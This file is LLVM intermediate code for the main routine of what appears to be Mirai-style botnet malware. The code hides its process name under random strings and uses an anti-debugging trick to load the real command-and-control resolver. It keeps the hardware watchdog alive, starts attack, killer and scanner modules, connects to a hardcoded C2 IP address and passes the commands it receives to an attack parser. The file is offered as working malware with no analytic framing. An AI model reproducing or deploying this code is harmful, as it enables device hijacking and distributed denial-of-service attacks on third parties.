; ModuleID = 'main.c'
source_filename = "main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.__sigset_t = type { [16 x i64] }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }

@fd_ctrl = dso_local global i32 -1, align 4
@fd_serv = dso_local global i32 -1, align 4
@watchdog_pid = dso_local global i32 0, align 4
@pending_connection = dso_local global i8 0, align 1
@resolve_func = dso_local global void ()* bitcast (i32 ()* @util_local_addr to void ()*), align 8
@LOCAL_ADDR = dso_local global i32 0, align 4
@srv_addr = dso_local global %struct.sockaddr_in zeroinitializer, align 4
@.str = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"\00\00\00\01\00", align 1
@.str.2 = private unnamed_addr constant [15 x i8] c"191.96.112.109\00", align 1

declare i32 @util_local_addr() #0

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @watchdog_maintain() #1 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = call i32 @fork() #5
  store i32 %4, i32* @watchdog_pid, align 4
  %5 = load i32, i32* @watchdog_pid, align 4
  %6 = icmp sgt i32 %5, 0
  br i1 %6, label %10, label %7

7:                                                ; preds = %0
  %8 = load i32, i32* @watchdog_pid, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

10:                                               ; preds = %7, %0
  ret void

11:                                               ; preds = %7
  store i32 1, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %3, align 4
  call void @table_unlock_val(i8 zeroext 23)
  call void @table_unlock_val(i8 zeroext 24)
  %12 = call i8* @table_retrieve_val(i32 23, i32* null)
  %13 = call i32 (i8*, i32, ...) @open(i8* %12, i32 2)
  store i32 %13, i32* %2, align 4
  %14 = icmp ne i32 %13, -1
  br i1 %14, label %19, label %15

15:                                               ; preds = %11
  %16 = call i8* @table_retrieve_val(i32 24, i32* null)
  %17 = call i32 (i8*, i32, ...) @open(i8* %16, i32 2)
  store i32 %17, i32* %2, align 4
  %18 = icmp ne i32 %17, -1
  br i1 %18, label %19, label %22

19:                                               ; preds = %15, %11
  store i32 1, i32* %3, align 4
  %20 = load i32, i32* %2, align 4
  %21 = call i32 (i32, i64, ...) @ioctl(i32 %20, i64 2147768068, i32* %1) #5
  br label %22

22:                                               ; preds = %19, %15
  %23 = load i32, i32* %3, align 4
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %30

25:                                               ; preds = %22
  br label %26

26:                                               ; preds = %25, %26
  %27 = load i32, i32* %2, align 4
  %28 = call i32 (i32, i64, ...) @ioctl(i32 %27, i64 2147768069, i32 0) #5
  %29 = call i32 @sleep(i32 10)
  br label %26

30:                                               ; preds = %22
  call void @table_lock_val(i8 zeroext 23)
  call void @table_lock_val(i8 zeroext 24)
  call void @exit(i32 0) #6
  unreachable
}

; Function Attrs: nounwind
declare i32 @fork() #2

declare void @table_unlock_val(i8 zeroext) #0

declare i32 @open(i8*, i32, ...) #0

declare i8* @table_retrieve_val(i32, i32*) #0

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #2

declare i32 @sleep(i32) #0

declare void @table_lock_val(i8 zeroext) #0

; Function Attrs: noreturn nounwind
declare void @exit(i32) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @main(i32 %0, i8** %1) #1 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [32 x i8], align 16
  %8 = alloca [32 x i8], align 16
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.__sigset_t, align 8
  %14 = alloca %struct.fd_set, align 8
  %15 = alloca %struct.fd_set, align 8
  %16 = alloca %struct.fd_set, align 8
  %17 = alloca %struct.timeval, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.fd_set*, align 8
  %22 = alloca i32, align 4
  %23 = alloca %struct.fd_set*, align 8
  %24 = alloca i16, align 2
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i16, align 2
  %30 = alloca [1024 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %9, align 4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %31 = call i32 @sigemptyset(%struct.__sigset_t* %13) #5
  %32 = call i32 @sigaddset(%struct.__sigset_t* %13, i32 2) #5
  %33 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %13, %struct.__sigset_t* null) #5
  %34 = call void (i32)* @signal(i32 17, void (i32)* inttoptr (i64 1 to void (i32)*)) #5
  %35 = call void (i32)* @signal(i32 5, void (i32)* @anti_gdb_entry) #5
  %36 = call i32 @util_local_addr()
  store i32 %36, i32* @LOCAL_ADDR, align 4
  store i16 2, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i32 0, i32 0), align 4
  %37 = call i32 @htonl(i32 -1334109607) #7
  store i32 %37, i32* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i32 0, i32 2, i32 0), align 4
  %38 = call zeroext i16 @htons(i16 zeroext 23) #7
  store i16 %38, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i32 0, i32 1), align 2
  call void @table_init()
  call void @anti_gdb_entry(i32 0)
  call void @rand_init()
  %39 = getelementptr inbounds [32 x i8], [32 x i8]* %8, i64 0, i64 0
  call void @util_zero(i8* %39, i32 32)
  %40 = load i32, i32* %4, align 4
  %41 = icmp eq i32 %40, 2
  br i1 %41, label %42, label %61

42:                                               ; preds = %2
  %43 = load i8**, i8*** %5, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 1
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 @util_strlen(i8* %45)
  %47 = icmp slt i32 %46, 32
  br i1 %47, label %48, label %61

48:                                               ; preds = %42
  %49 = getelementptr inbounds [32 x i8], [32 x i8]* %8, i64 0, i64 0
  %50 = load i8**, i8*** %5, align 8
  %51 = getelementptr inbounds i8*, i8** %50, i64 1
  %52 = load i8*, i8** %51, align 8
  %53 = call i32 @util_strcpy(i8* %49, i8* %52)
  %54 = load i8**, i8*** %5, align 8
  %55 = getelementptr inbounds i8*, i8** %54, i64 1
  %56 = load i8*, i8** %55, align 8
  %57 = load i8**, i8*** %5, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 1
  %59 = load i8*, i8** %58, align 8
  %60 = call i32 @util_strlen(i8* %59)
  call void @util_zero(i8* %56, i32 %60)
  br label %61

61:                                               ; preds = %48, %42, %2
  %62 = call i32 @rand_next()
  %63 = load i8**, i8*** %5, align 8
  %64 = getelementptr inbounds i8*, i8** %63, i64 0
  %65 = load i8*, i8** %64, align 8
  %66 = call i32 @util_strlen(i8* %65)
  %67 = sub nsw i32 20, %66
  %68 = urem i32 %62, %67
  %69 = load i8**, i8*** %5, align 8
  %70 = getelementptr inbounds i8*, i8** %69, i64 0
  %71 = load i8*, i8** %70, align 8
  %72 = call i32 @util_strlen(i8* %71)
  %73 = add i32 %68, %72
  store i32 %73, i32* %9, align 4
  %74 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  %75 = load i32, i32* %9, align 4
  call void @rand_alpha_str(i8* %74, i32 %75)
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %77
  store i8 0, i8* %78, align 1
  %79 = load i8**, i8*** %5, align 8
  %80 = getelementptr inbounds i8*, i8** %79, i64 0
  %81 = load i8*, i8** %80, align 8
  %82 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  %83 = call i32 @util_strcpy(i8* %81, i8* %82)
  %84 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  call void @util_zero(i8* %84, i32 32)
  %85 = call i32 @rand_next()
  %86 = load i8**, i8*** %5, align 8
  %87 = getelementptr inbounds i8*, i8** %86, i64 0
  %88 = load i8*, i8** %87, align 8
  %89 = call i32 @util_strlen(i8* %88)
  %90 = sub nsw i32 20, %89
  %91 = urem i32 %85, %90
  %92 = load i8**, i8*** %5, align 8
  %93 = getelementptr inbounds i8*, i8** %92, i64 0
  %94 = load i8*, i8** %93, align 8
  %95 = call i32 @util_strlen(i8* %94)
  %96 = add i32 %91, %95
  store i32 %96, i32* %9, align 4
  %97 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  %98 = load i32, i32* %9, align 4
  call void @rand_alpha_str(i8* %97, i32 %98)
  %99 = load i32, i32* %9, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %100
  store i8 0, i8* %101, align 1
  %102 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  %103 = call i32 (i32, ...) @prctl(i32 15, i8* %102) #5
  call void @table_unlock_val(i8 zeroext 3)
  %104 = call i8* @table_retrieve_val(i32 3, i32* %10)
  store i8* %104, i8** %6, align 8
  %105 = load i8*, i8** %6, align 8
  %106 = load i32, i32* %10, align 4
  %107 = sext i32 %106 to i64
  %108 = call i64 @write(i32 1, i8* %105, i64 %107)
  %109 = call i64 @write(i32 1, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0), i64 1)
  call void @table_lock_val(i8 zeroext 3)
  %110 = call signext i8 @attack_init()
  call void @killer_init()
  call void @watchdog_maintain()
  %111 = call i32 @fork() #5
  %112 = icmp sgt i32 %111, 0
  br i1 %112, label %113, label %114

113:                                              ; preds = %61
  ret i32 0

114:                                              ; preds = %61
  %115 = call i32 @setsid() #5
  store i32 %115, i32* %11, align 4
  %116 = call i32 @close(i32 0)
  %117 = call i32 @close(i32 1)
  %118 = call i32 @close(i32 2)
  %119 = call signext i8 @attack_init()
  call void @killer_init()
  call void @watchdog_maintain()
  call void (...) @scanner_init()
  br label %120

120:                                              ; preds = %114, %214, %316, %322, %327, %337, %362, %368, %389
  br label %121

121:                                              ; preds = %120
  store %struct.fd_set* %14, %struct.fd_set** %21, align 8
  store i32 0, i32* %20, align 4
  br label %122

122:                                              ; preds = %132, %121
  %123 = load i32, i32* %20, align 4
  %124 = zext i32 %123 to i64
  %125 = icmp ult i64 %124, 16
  br i1 %125, label %126, label %135

126:                                              ; preds = %122
  %127 = load %struct.fd_set*, %struct.fd_set** %21, align 8
  %128 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %127, i32 0, i32 0
  %129 = load i32, i32* %20, align 4
  %130 = zext i32 %129 to i64
  %131 = getelementptr inbounds [16 x i64], [16 x i64]* %128, i64 0, i64 %130
  store i64 0, i64* %131, align 8
  br label %132

132:                                              ; preds = %126
  %133 = load i32, i32* %20, align 4
  %134 = add i32 %133, 1
  store i32 %134, i32* %20, align 4
  br label %122, !llvm.loop !6

135:                                              ; preds = %122
  br label %136

136:                                              ; preds = %135
  br label %137

137:                                              ; preds = %136
  store %struct.fd_set* %15, %struct.fd_set** %23, align 8
  store i32 0, i32* %22, align 4
  br label %138

138:                                              ; preds = %148, %137
  %139 = load i32, i32* %22, align 4
  %140 = zext i32 %139 to i64
  %141 = icmp ult i64 %140, 16
  br i1 %141, label %142, label %151

142:                                              ; preds = %138
  %143 = load %struct.fd_set*, %struct.fd_set** %23, align 8
  %144 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %143, i32 0, i32 0
  %145 = load i32, i32* %22, align 4
  %146 = zext i32 %145 to i64
  %147 = getelementptr inbounds [16 x i64], [16 x i64]* %144, i64 0, i64 %146
  store i64 0, i64* %147, align 8
  br label %148

148:                                              ; preds = %142
  %149 = load i32, i32* %22, align 4
  %150 = add i32 %149, 1
  store i32 %150, i32* %22, align 4
  br label %138, !llvm.loop !8

151:                                              ; preds = %138
  br label %152

152:                                              ; preds = %151
  %153 = load i32, i32* @fd_ctrl, align 4
  %154 = icmp ne i32 %153, -1
  br i1 %154, label %155, label %167

155:                                              ; preds = %152
  %156 = load i32, i32* @fd_ctrl, align 4
  %157 = srem i32 %156, 64
  %158 = zext i32 %157 to i64
  %159 = shl i64 1, %158
  %160 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %14, i32 0, i32 0
  %161 = load i32, i32* @fd_ctrl, align 4
  %162 = sdiv i32 %161, 64
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds [16 x i64], [16 x i64]* %160, i64 0, i64 %163
  %165 = load i64, i64* %164, align 8
  %166 = or i64 %165, %159
  store i64 %166, i64* %164, align 8
  br label %167

167:                                              ; preds = %155, %152
  %168 = load i32, i32* @fd_serv, align 4
  %169 = icmp eq i32 %168, -1
  br i1 %169, label %170, label %171

170:                                              ; preds = %167
  call void @establish_connection()
  br label %171

171:                                              ; preds = %170, %167
  %172 = load i8, i8* @pending_connection, align 1
  %173 = icmp ne i8 %172, 0
  br i1 %173, label %174, label %186

174:                                              ; preds = %171
  %175 = load i32, i32* @fd_serv, align 4
  %176 = srem i32 %175, 64
  %177 = zext i32 %176 to i64
  %178 = shl i64 1, %177
  %179 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %15, i32 0, i32 0
  %180 = load i32, i32* @fd_serv, align 4
  %181 = sdiv i32 %180, 64
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds [16 x i64], [16 x i64]* %179, i64 0, i64 %182
  %184 = load i64, i64* %183, align 8
  %185 = or i64 %184, %178
  store i64 %185, i64* %183, align 8
  br label %198

186:                                              ; preds = %171
  %187 = load i32, i32* @fd_serv, align 4
  %188 = srem i32 %187, 64
  %189 = zext i32 %188 to i64
  %190 = shl i64 1, %189
  %191 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %14, i32 0, i32 0
  %192 = load i32, i32* @fd_serv, align 4
  %193 = sdiv i32 %192, 64
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds [16 x i64], [16 x i64]* %191, i64 0, i64 %194
  %196 = load i64, i64* %195, align 8
  %197 = or i64 %196, %190
  store i64 %197, i64* %195, align 8
  br label %198

198:                                              ; preds = %186, %174
  %199 = load i32, i32* @fd_ctrl, align 4
  %200 = load i32, i32* @fd_serv, align 4
  %201 = icmp sgt i32 %199, %200
  br i1 %201, label %202, label %204

202:                                              ; preds = %198
  %203 = load i32, i32* @fd_ctrl, align 4
  store i32 %203, i32* %18, align 4
  br label %206

204:                                              ; preds = %198
  %205 = load i32, i32* @fd_serv, align 4
  store i32 %205, i32* %18, align 4
  br label %206

206:                                              ; preds = %204, %202
  %207 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 1
  store i64 0, i64* %207, align 8
  %208 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 0
  store i64 10, i64* %208, align 8
  %209 = load i32, i32* %18, align 4
  %210 = add nsw i32 %209, 1
  %211 = call i32 @select(i32 %210, %struct.fd_set* %14, %struct.fd_set* %15, %struct.fd_set* null, %struct.timeval* %17)
  store i32 %211, i32* %19, align 4
  %212 = load i32, i32* %19, align 4
  %213 = icmp eq i32 %212, -1
  br i1 %213, label %214, label %215

214:                                              ; preds = %206
  br label %120

215:                                              ; preds = %206
  %216 = load i32, i32* %19, align 4
  %217 = icmp eq i32 %216, 0
  br i1 %217, label %218, label %228

218:                                              ; preds = %215
  store i16 0, i16* %24, align 2
  %219 = load i32, i32* %12, align 4
  %220 = add nsw i32 %219, 1
  store i32 %220, i32* %12, align 4
  %221 = srem i32 %219, 6
  %222 = icmp eq i32 %221, 0
  br i1 %222, label %223, label %227

223:                                              ; preds = %218
  %224 = load i32, i32* @fd_serv, align 4
  %225 = bitcast i16* %24 to i8*
  %226 = call i64 @send(i32 %224, i8* %225, i64 2, i32 16384)
  br label %227

227:                                              ; preds = %223, %218
  br label %228

228:                                              ; preds = %227, %215
  br label %229

229:                                              ; preds = %228
  %230 = load i8, i8* @pending_connection, align 1
  %231 = icmp ne i8 %230, 0
  br i1 %231, label %232, label %280

232:                                              ; preds = %229
  store i8 0, i8* @pending_connection, align 1
  %233 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %15, i32 0, i32 0
  %234 = load i32, i32* @fd_serv, align 4
  %235 = sdiv i32 %234, 64
  %236 = sext i32 %235 to i64
  %237 = getelementptr inbounds [16 x i64], [16 x i64]* %233, i64 0, i64 %236
  %238 = load i64, i64* %237, align 8
  %239 = load i32, i32* @fd_serv, align 4
  %240 = srem i32 %239, 64
  %241 = zext i32 %240 to i64
  %242 = shl i64 1, %241
  %243 = and i64 %238, %242
  %244 = icmp ne i64 %243, 0
  br i1 %244, label %246, label %245

245:                                              ; preds = %232
  call void @teardown_connection()
  br label %279

246:                                              ; preds = %232
  store i32 0, i32* %25, align 4
  store i32 4, i32* %26, align 4
  %247 = load i32, i32* @fd_serv, align 4
  %248 = bitcast i32* %25 to i8*
  %249 = call i32 @getsockopt(i32 %247, i32 1, i32 4, i8* %248, i32* %26) #5
  %250 = load i32, i32* %25, align 4
  %251 = icmp ne i32 %250, 0
  br i1 %251, label %252, label %259

252:                                              ; preds = %246
  %253 = load i32, i32* @fd_serv, align 4
  %254 = call i32 @close(i32 %253)
  store i32 -1, i32* @fd_serv, align 4
  %255 = call i32 @rand_next()
  %256 = urem i32 %255, 10
  %257 = add i32 %256, 1
  %258 = call i32 @sleep(i32 %257)
  br label %278

259:                                              ; preds = %246
  %260 = getelementptr inbounds [32 x i8], [32 x i8]* %8, i64 0, i64 0
  %261 = call i32 @util_strlen(i8* %260)
  %262 = trunc i32 %261 to i8
  store i8 %262, i8* %27, align 1
  %263 = call i32 @util_local_addr()
  store i32 %263, i32* @LOCAL_ADDR, align 4
  %264 = load i32, i32* @fd_serv, align 4
  %265 = call i64 @send(i32 %264, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0), i64 4, i32 16384)
  %266 = load i32, i32* @fd_serv, align 4
  %267 = call i64 @send(i32 %266, i8* %27, i64 1, i32 16384)
  %268 = load i8, i8* %27, align 1
  %269 = zext i8 %268 to i32
  %270 = icmp sgt i32 %269, 0
  br i1 %270, label %271, label %277

271:                                              ; preds = %259
  %272 = load i32, i32* @fd_serv, align 4
  %273 = getelementptr inbounds [32 x i8], [32 x i8]* %8, i64 0, i64 0
  %274 = load i8, i8* %27, align 1
  %275 = zext i8 %274 to i64
  %276 = call i64 @send(i32 %272, i8* %273, i64 %275, i32 16384)
  br label %277

277:                                              ; preds = %271, %259
  br label %278

278:                                              ; preds = %277, %252
  br label %279

279:                                              ; preds = %278, %245
  br label %389

280:                                              ; preds = %229
  %281 = load i32, i32* @fd_serv, align 4
  %282 = icmp ne i32 %281, -1
  br i1 %282, label %283, label %388

283:                                              ; preds = %280
  %284 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %14, i32 0, i32 0
  %285 = load i32, i32* @fd_serv, align 4
  %286 = sdiv i32 %285, 64
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds [16 x i64], [16 x i64]* %284, i64 0, i64 %287
  %289 = load i64, i64* %288, align 8
  %290 = load i32, i32* @fd_serv, align 4
  %291 = srem i32 %290, 64
  %292 = zext i32 %291 to i64
  %293 = shl i64 1, %292
  %294 = and i64 %289, %293
  %295 = icmp ne i64 %294, 0
  br i1 %295, label %296, label %388

296:                                              ; preds = %283
  store i32 0, i32* %28, align 4
  store i16 0, i16* %29, align 2
  %297 = call i32* @__errno_location() #7
  store i32 0, i32* %297, align 4
  %298 = load i32, i32* @fd_serv, align 4
  %299 = bitcast i16* %29 to i8*
  %300 = call i64 @recv(i32 %298, i8* %299, i64 2, i32 16386)
  %301 = trunc i64 %300 to i32
  store i32 %301, i32* %28, align 4
  %302 = load i32, i32* %28, align 4
  %303 = icmp eq i32 %302, -1
  br i1 %303, label %304, label %319

304:                                              ; preds = %296
  %305 = call i32* @__errno_location() #7
  %306 = load i32, i32* %305, align 4
  %307 = icmp eq i32 %306, 11
  br i1 %307, label %316, label %308

308:                                              ; preds = %304
  %309 = call i32* @__errno_location() #7
  %310 = load i32, i32* %309, align 4
  %311 = icmp eq i32 %310, 11
  br i1 %311, label %316, label %312

312:                                              ; preds = %308
  %313 = call i32* @__errno_location() #7
  %314 = load i32, i32* %313, align 4
  %315 = icmp eq i32 %314, 4
  br i1 %315, label %316, label %317

316:                                              ; preds = %312, %308, %304
  br label %120

317:                                              ; preds = %312
  store i32 0, i32* %28, align 4
  br label %318

318:                                              ; preds = %317
  br label %319

319:                                              ; preds = %318, %296
  %320 = load i32, i32* %28, align 4
  %321 = icmp eq i32 %320, 0
  br i1 %321, label %322, label %323

322:                                              ; preds = %319
  call void @teardown_connection()
  br label %120

323:                                              ; preds = %319
  %324 = load i16, i16* %29, align 2
  %325 = zext i16 %324 to i32
  %326 = icmp eq i32 %325, 0
  br i1 %326, label %327, label %331

327:                                              ; preds = %323
  %328 = load i32, i32* @fd_serv, align 4
  %329 = bitcast i16* %29 to i8*
  %330 = call i64 @recv(i32 %328, i8* %329, i64 2, i32 16384)
  br label %120

331:                                              ; preds = %323
  %332 = load i16, i16* %29, align 2
  %333 = call zeroext i16 @ntohs(i16 zeroext %332) #7
  store i16 %333, i16* %29, align 2
  %334 = load i16, i16* %29, align 2
  %335 = zext i16 %334 to i64
  %336 = icmp ugt i64 %335, 1024
  br i1 %336, label %337, label %340

337:                                              ; preds = %331
  %338 = load i32, i32* @fd_serv, align 4
  %339 = call i32 @close(i32 %338)
  store i32 -1, i32* @fd_serv, align 4
  br label %120

340:                                              ; preds = %331
  %341 = call i32* @__errno_location() #7
  store i32 0, i32* %341, align 4
  %342 = load i32, i32* @fd_serv, align 4
  %343 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i64 0, i64 0
  %344 = load i16, i16* %29, align 2
  %345 = zext i16 %344 to i64
  %346 = call i64 @recv(i32 %342, i8* %343, i64 %345, i32 16386)
  %347 = trunc i64 %346 to i32
  store i32 %347, i32* %28, align 4
  %348 = load i32, i32* %28, align 4
  %349 = icmp eq i32 %348, -1
  br i1 %349, label %350, label %365

350:                                              ; preds = %340
  %351 = call i32* @__errno_location() #7
  %352 = load i32, i32* %351, align 4
  %353 = icmp eq i32 %352, 11
  br i1 %353, label %362, label %354

354:                                              ; preds = %350
  %355 = call i32* @__errno_location() #7
  %356 = load i32, i32* %355, align 4
  %357 = icmp eq i32 %356, 11
  br i1 %357, label %362, label %358

358:                                              ; preds = %354
  %359 = call i32* @__errno_location() #7
  %360 = load i32, i32* %359, align 4
  %361 = icmp eq i32 %360, 4
  br i1 %361, label %362, label %363

362:                                              ; preds = %358, %354, %350
  br label %120

363:                                              ; preds = %358
  store i32 0, i32* %28, align 4
  br label %364

364:                                              ; preds = %363
  br label %365

365:                                              ; preds = %364, %340
  %366 = load i32, i32* %28, align 4
  %367 = icmp eq i32 %366, 0
  br i1 %367, label %368, label %369

368:                                              ; preds = %365
  call void @teardown_connection()
  br label %120

369:                                              ; preds = %365
  %370 = load i32, i32* @fd_serv, align 4
  %371 = bitcast i16* %29 to i8*
  %372 = call i64 @recv(i32 %370, i8* %371, i64 2, i32 16384)
  %373 = load i16, i16* %29, align 2
  %374 = call zeroext i16 @ntohs(i16 zeroext %373) #7
  store i16 %374, i16* %29, align 2
  %375 = load i32, i32* @fd_serv, align 4
  %376 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i64 0, i64 0
  %377 = load i16, i16* %29, align 2
  %378 = zext i16 %377 to i64
  %379 = call i64 @recv(i32 %375, i8* %376, i64 %378, i32 16384)
  %380 = load i16, i16* %29, align 2
  %381 = zext i16 %380 to i32
  %382 = icmp sgt i32 %381, 0
  br i1 %382, label %383, label %387

383:                                              ; preds = %369
  %384 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i64 0, i64 0
  %385 = load i16, i16* %29, align 2
  %386 = zext i16 %385 to i32
  call void @attack_parse(i8* %384, i32 %386)
  br label %387

387:                                              ; preds = %383, %369
  br label %388

388:                                              ; preds = %387, %283, %280
  br label %389

389:                                              ; preds = %388, %279
  br label %120
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #2

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #2

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #2

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @anti_gdb_entry(i32 %0) #1 {
  %2 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  store void ()* @resolve_cnc_addr, void ()** @resolve_func, align 8
  ret void
}

; Function Attrs: nounwind readnone willreturn
declare i32 @htonl(i32) #4

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #4

declare void @table_init() #0

declare void @rand_init() #0

declare void @util_zero(i8*, i32) #0

declare i32 @util_strlen(i8*) #0

declare i32 @util_strcpy(i8*, i8*) #0

declare i32 @rand_next() #0

declare void @rand_alpha_str(i8*, i32) #0

; Function Attrs: nounwind
declare i32 @prctl(i32, ...) #2

declare i64 @write(i32, i8*, i64) #0

declare signext i8 @attack_init() #0

declare void @killer_init() #0

; Function Attrs: nounwind
declare i32 @setsid() #2

declare i32 @close(i32) #0

declare void @scanner_init(...) #0

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @establish_connection() #1 {
  %1 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %2 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %2, i32* @fd_serv, align 4
  %3 = icmp eq i32 %2, -1
  br i1 %3, label %4, label %5

4:                                                ; preds = %0
  br label %21

5:                                                ; preds = %0
  %6 = load i32, i32* @fd_serv, align 4
  %7 = load i32, i32* @fd_serv, align 4
  %8 = call i32 (i32, i32, ...) @fcntl(i32 %7, i32 3, i32 0)
  %9 = or i32 2048, %8
  %10 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 4, i32 %9)
  %11 = load void ()*, void ()** @resolve_func, align 8
  %12 = icmp ne void ()* %11, null
  br i1 %12, label %13, label %15

13:                                               ; preds = %5
  %14 = load void ()*, void ()** @resolve_func, align 8
  call void %14()
  br label %15

15:                                               ; preds = %13, %5
  store i8 1, i8* @pending_connection, align 1
  %16 = load i32, i32* @fd_serv, align 4
  %17 = bitcast %union.__CONST_SOCKADDR_ARG* %1 to %struct.sockaddr**
  store %struct.sockaddr* bitcast (%struct.sockaddr_in* @srv_addr to %struct.sockaddr*), %struct.sockaddr** %17, align 8
  %18 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %1, i32 0, i32 0
  %19 = load %struct.sockaddr*, %struct.sockaddr** %18, align 8
  %20 = call i32 @connect(i32 %16, %struct.sockaddr* %19, i32 16)
  br label %21

21:                                               ; preds = %15, %4
  ret void
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #0

declare i64 @send(i32, i8*, i64, i32) #0

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @teardown_connection() #1 {
  %1 = load i32, i32* @fd_serv, align 4
  %2 = icmp ne i32 %1, -1
  br i1 %2, label %3, label %6

3:                                                ; preds = %0
  %4 = load i32, i32* @fd_serv, align 4
  %5 = call i32 @close(i32 %4)
  br label %6

6:                                                ; preds = %3, %0
  store i32 -1, i32* @fd_serv, align 4
  %7 = call i32 @sleep(i32 1)
  ret void
}

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #2

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #4

declare i64 @recv(i32, i8*, i64, i32) #0

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @ntohs(i16 zeroext) #4

declare void @attack_parse(i8*, i32) #0

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @resolve_cnc_addr() #1 {
  call void @table_unlock_val(i8 zeroext 1)
  %1 = call i32 @inet_addr(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.2, i64 0, i64 0)) #5
  store i32 %1, i32* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i32 0, i32 2, i32 0), align 4
  %2 = call i8* @table_retrieve_val(i32 1, i32* null)
  %3 = bitcast i8* %2 to i16*
  %4 = load i16, i16* %3, align 2
  store i16 %4, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i32 0, i32 1), align 2
  call void @table_lock_val(i8 zeroext 1)
  ret void
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #2

declare i32 @fcntl(i32, i32, ...) #0

declare i32 @connect(i32, %struct.sockaddr*, i32) #0

attributes #0 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
